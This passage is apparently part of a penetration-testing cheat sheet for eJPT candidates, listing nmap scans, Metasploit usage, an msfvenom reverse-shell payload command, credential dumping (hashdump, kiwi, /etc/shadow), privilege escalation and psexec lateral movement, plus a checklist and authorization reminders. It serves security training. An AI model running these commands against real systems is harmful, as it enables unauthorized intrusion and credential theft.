nmap -sS -sV -O -sC -p- <TARGET>

# Quick Scan
nmap -Pn -sV <TARGET>

# Service Enumeration
nmap -p 445 --script smb-* <TARGET>
nmap -p 22 --script ssh* <TARGET>
nmap -p 80 --script http* <TARGET>
```

### Exploitation

```bash
# Search for Exploit
searchsploit <SERVICE> <VERSION>

# Generate Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

# Metasploit
msfconsole
use exploit/...
set RHOSTS <TARGET>
exploit
```

### Post-Exploitation

```bash
# Windows
sysinfo
getuid
getsystem
hashdump
load kiwi
creds_all

# Linux
whoami
id
sudo -l
cat /etc/passwd
cat /etc/shadow (if root)
```

### Privilege Escalation

```bash
# Windows
use post/multi/recon/local_exploit_suggester
migrate <PID>
load incognito
list_tokens -u

# Linux
find / -perm -4000 -type f
sudo -l
./linux-exploit-suggester.sh
```

### Lateral Movement

```bash
# SMB
psexec.py <DOMAIN>/<USER>:<PASS>@<TARGET>
smbclient \\\\<TARGET>\\<SHARE> -U <USER>

# SSH
ssh <USER>@<TARGET>
ssh -i <KEY> <USER>@<TARGET>

# RDP
xfreerdp /u:<USER> /p:<PASS> /v:<TARGET>
```

---

## PENETRATION TESTING CHECKLIST

- [ ] **Reconnaissance**
  - [ ] Passive information gathering
  - [ ] Active information gathering
  - [ ] Network mapping
  - [ ] Social engineering

- [ ] **Scanning**
  - [ ] Network scanning
  - [ ] Service enumeration
  - [ ] Vulnerability scanning
  - [ ] Web application scanning

- [ ] **Enumeration**
  - [ ] SMB enumeration
  - [ ] FTP enumeration
  - [ ] SSH enumeration
  - [ ] HTTP enumeration
  - [ ] Database enumeration

- [ ] **Vulnerability Assessment**
  - [ ] Identified vulnerabilities
  - [ ] CVSS scoring
  - [ ] Exploitation feasibility

- [ ] **Exploitation**
  - [ ] Gained initial access
  - [ ] Established shell/Meterpreter
  - [ ] Validated compromise

- [ ] **Post-Exploitation**
  - [ ] System reconnaissance
  - [ ] Credential harvesting
  - [ ] Information gathering
  - [ ] Persistence mechanisms

- [ ] **Privilege Escalation**
  - [ ] Escalation paths identified
  - [ ] Escalation executed
  - [ ] Obtained admin/root access

- [ ] **Lateral Movement**
  - [ ] Network reconnaissance
  - [ ] Target identification
  - [ ] Compromise of additional systems

- [ ] **Data Exfiltration**
  - [ ] Sensitive data identified
  - [ ] Data exfiltrated
  - [ ] Cleanup completed

- [ ] **Reporting**
  - [ ] Findings documented
  - [ ] Proofs of concept collected
  - [ ] Remediation recommendations provided
  - [ ] Report reviewed and delivered

---

## Important Notes

⚠️ **Legal & Ethical Obligations:**
- Only test with explicit written authorization
- Follow all applicable laws and regulations
- Respect target system boundaries
- Maintain confidentiality of findings
- Document all activities
- Report findings responsibly

✅ **Best Practices:**
- Use separate testing tools
- Maintain clean logs
- Test in isolated lab environments
- Verify findings before reporting
- Provide actionable remediation
- Establish clear scope and timeline

---

**Last Updated:** 2024  
**Status:** Comprehensive Methodology Guide  
**Designed For:** Penetration Testers, Security Professionals, eJPT Candidates
